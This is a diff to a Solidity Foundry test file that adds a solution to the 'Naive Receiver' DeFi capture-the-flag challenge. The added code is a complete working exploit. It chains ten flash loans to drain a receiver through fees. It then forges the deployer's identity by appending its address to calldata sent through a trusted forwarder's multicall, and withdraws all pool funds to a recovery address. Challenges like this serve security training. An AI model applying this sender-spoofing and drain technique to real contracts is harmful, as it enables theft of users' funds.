@@ -77,7 +77,47 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        {
+            bytes[] memory data = new bytes[](11);
+            for (uint i = 0; i < 11; ++i) {
+                data[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 1 ether, bytes("")));
+            }
+            data[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), deployer);
+
+            BasicForwarder.Request memory request = BasicForwarder.Request({
+                from: player,
+                target: address(pool),
+                value: 0,
+                gas: 1000000,
+                nonce: 0,
+                deadline: type(uint256).max,
+                data: abi.encodeWithSignature("multicall(bytes[])", data)
+            });
+            bytes32 hash_ = _hashTypedData(forwarder.domainSeparator(), forwarder.getDataHash(request));
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, hash_);
+            bytes memory signature = abi.encodePacked(r, s, v);
+            forwarder.execute(request, signature);
+        }
+    }
+
+    function _hashTypedData(bytes32 domainSeparator, bytes32 structHash)
+        internal
+        view
+        virtual
+        returns (bytes32 digest)
+    {
+        // We will use `digest` to store the domain separator to save a bit of gas.
+        digest = domainSeparator;
+        /// @solidity memory-safe-assembly
+        assembly {
+            // Compute the digest.
+            mstore(0x00, 0x1901000000000000) // Store "\x19\x01".
+            mstore(0x1a, digest) // Store the domain separator.
+            mstore(0x3a, structHash) // Store the struct hash.
+            digest := keccak256(0x18, 0x42)
+            // Restore the part of the free memory slot that was overwritten.
+            mstore(0x3a, 0)
+        }
     }
 
     /**
